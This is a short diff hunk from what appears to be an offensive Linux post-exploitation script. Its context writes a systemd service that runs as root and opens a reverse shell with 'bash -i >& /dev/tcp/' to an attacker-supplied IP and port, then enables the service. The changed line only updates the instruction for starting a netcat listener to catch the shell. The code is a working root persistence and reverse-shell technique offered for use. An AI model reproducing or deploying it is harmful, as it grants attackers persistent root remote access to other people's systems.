@@ -786,7 +786,7 @@ while true; do
 			if [[ "$MPRT" != "" ]];
 			then
 				echo -ne "[Unit]\nDescription=root\n\n[Service]\nType=simple\nUser=root\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/""$MIP""/""$MPRT"" 0>&1'\n\n[Install]\nWantedBy=multi-user.target\n" > test.service
-				echo "run 'nc -lvn ""$MPRT""' in your host"
+				echo "run 'nc -lvnp ""$MPRT""' in your host or execute linuxallremote and select 102 option"
 				read -p "Press enter to run RevShell"
 				systemctl enable ./test.service
 			fi
